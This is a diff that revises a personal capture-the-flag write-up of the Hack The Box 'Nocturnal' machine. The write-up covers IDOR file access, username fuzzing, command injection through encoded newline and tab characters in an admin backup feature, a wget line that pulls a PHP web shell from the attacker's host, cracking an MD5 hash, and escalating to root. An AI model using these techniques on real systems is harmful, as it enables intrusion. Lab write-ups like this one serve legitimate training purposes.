@@ -8,7 +8,7 @@ image: /docs/assets/2025-05/htb-nocturnal-0.png
 
 ## Enumeration and Analysis
 
-When accessing the IP directly on the browser, we are automatically redirected to `nocturnal.htb`. So I added the domain to my `/etc/hosts`:
+When accessing the IP directly on the browser, I was redirected to `nocturnal.htb`. So I added the domain to my `/etc/hosts`:
 
 ```
 > echo "10.10.11.64     nocturnal.htb" >> /etc/hosts
@@ -47,15 +47,15 @@ Nmap done: 1 IP address (1 host up) scanned in 8.88 seconds
 
 ---
 
-From here, you can register a new account and log into it. Here you can upload and retrieve your own files.
+From here, I was able to register a new account and log into it. Here I could upload and retrieve my own files.
 
 ![Upload page](/docs/assets/2025-05/htb-nocturnal-2.png)
 
 > I tried different code injection methods since the upload is limited to extensions pdf, doc, docx, xls, xlsx and odt.
 
-When clicking a file, the retrieval path expects two parameters: `username` and `file`. And when trying to retrieve a file that doesn't exist, a list of available files is shown on the page.
+When retrieving a file, the path expects two parameters: `username` and `file`. And when trying to retrieve a file that doesn't exist, a list of available files is shown on the page.
 
-This page doesn't seem to validate the queried username against the current active session, meaning that I can access other user's files.
+This page doesn't seem to validate the queried username against the current active session, meaning that I could see and access other user's files.
 
 I used `wfuzz` to list usernames that return a different content size other than the "User not found error page":
 
@@ -74,25 +74,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 000000086:   200        128 L    247 W      3037 Ch     "admin"                                             
 000000375:   200        128 L    253 W      3481 Ch     "amanda"                                            
-000002409:   500        122 L    236 W      2919 Ch     "dear"                                              
-000002408:   500        122 L    236 W      2919 Ch     "deanne"                                            
-000002407:   500        122 L    236 W      2919 Ch     "de-anna"                                           
-000002406:   500        122 L    236 W      2919 Ch     "deanna"                                            
-000002404:   500        122 L    236 W      2919 Ch     "deane"                                             
-000002405:   500        122 L    236 W      2919 Ch     "deann"                                             
-000002401:   500        122 L    236 W      2919 Ch     "deana"                                             
-000002402:   500        122 L    236 W      2919 Ch     "deandra"                                           
-000002400:   500        122 L    236 W      2919 Ch     "dean"                                              
-000002399:   500        122 L    236 W      2919 Ch     "deacon"                                            
-000002398:   500        122 L    236 W      2919 Ch     "de"                                                
-000002397:   500        122 L    236 W      2919 Ch     "ddene"                                             
-000002394:   500        122 L    236 W      2919 Ch     "dayna"                                             
-000002396:   500        122 L    236 W      2919 Ch     "dayton"                                            
-000002439:   500        122 L    236 W      2919 Ch     "deja"                                              
-000002390:   500        122 L    236 W      2919 Ch     "daya"                                              
-000002392:   500        122 L    236 W      2919 Ch     "daylen"                                            
-000002393:   500        122 L    236 W      2919 Ch     "daylon"                                            
-000002441:   500        122 L    236 W      2919 Ch     "del"                                               
+...                                             
 000006619:   200        128 L    248 W      3103 Ch     "me"                                                
 000007640:   200        128 L    247 W      3037 Ch     "peter"                                             
 000008867:   200        128 L    268 W      6130 Ch     "sol"                                               
@@ -106,7 +88,7 @@ Requests/sec.: 263.0599
 
 ## Admin access
 
-Looking through some of the users, the user `amanda` have a file called `privacy.odt` with the following content:
+Looking through the files of the found users, `amanda` has a file called `privacy.odt` with the following content:
 
 ```
 Dear Amanda,
@@ -124,7 +106,7 @@ Logging in as `amanda`, it looks like she has admin access:
 
 ![Admin's page](/docs/assets/2025-05/htb-nocturnal-4.png)
 
-From here, I can access the source code and create backups.
+From this page, I can access the source code and create backups.
 
 Looking at the source code of the admin page, the building of the `zip` command looks really problematic, and susceptible to command injection.
 
@@ -141,7 +123,7 @@ And `%0Aid%0A`, which gave back
 sh: 3: backups/backup_2025-05-05.zip: Permission denied
 ```
 
-It looks like I can send a encoded line break, and it is used as a command delimiter.
+It looks like I can use an encoded line break as a command delimiter.
 
 After some more testing, I saw that a encoded tab `%09` works as a space for the commands (thank you Claude).
 
@@ -150,12 +132,11 @@ Using these two substitutions I was able to execute a `wget` and download a webs
 This essentially translates to this when getting parsed:
 
 ```
-
-/usr/bin/wget	<tun0 ip>:1337/shell.php
-
+-LINE BREAK-
+/usr/bin/wget -TAB- <tun0 ip>:1337/shell.php -LINE BREAK-
 ```
 
-Transforming the command into:
+Transforming the final command into:
 
 ```
 zip -x './backups/*' -r -P 
@@ -163,7 +144,7 @@ zip -x './backups/*' -r -P
  backups/backup_2025-05-05.zip > logfile.txt 2>&1 &
 ```
 
-And even though we get a `sh: 3: backups/backup_2025-05-05.zip: not found` error on the page (because the command on line 3 is wrong and will fail), we can see a hit on the API: 
+And even though I got a `sh: 3: backups/backup_2025-05-05.zip: not found` error on the page (because the command on line 3 is not valid), I could see a hit on the API: 
 
 ```
 > python3 -m http.server 1337
@@ -171,7 +152,7 @@ Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 <tun0 ip> - - [05/May/2025 xx:xx:xx] "GET /shell.php HTTP/1.1" 200 -
 ```
 
-And refreshing the page, we can also see the file available on the root directory.
+And refreshing the page, I can also see the file available on the root directory.
 
 ## Lateral movement
 
@@ -226,14 +207,14 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 ...
 ```
 
-So this is a very fast `hashcat` search:
+So this is a very fast process:
 
 ```
 > hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --show
 55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
 ```
 
-This hash match the user `tobias`. Checking for password reuse on SSH, we are in 😎.
+This hash matches the user `tobias`. Checking for password reuse on SSH, we are in 😎.
 
 ```
 tobias@nocturnal:~$ cat user.txt 
@@ -331,3 +312,11 @@ uid=0(root) gid=0(root) groups=0(root)
 ispconfig-shell# cat /root/root.txt
 <root flag>
 ```
+
+## Review
+
+This one was by far the hardest machine I've played so far. The average review on HTB is late easy to early medium, and I can definitely agree with this.
+
+I ended up loosing a lot of time on simple things, like the password reuse from `tobias` on the `ISP Config` web service. This could have been a little more obvious than simply guessing. Maybe a `is_admin` field on the sqlite database user table could hint towards this route.
+
+The password reuse there is believable, but it is kind of a wild jump, specially having the knowledge that `amanda` was the one with admin rights on the main web service.
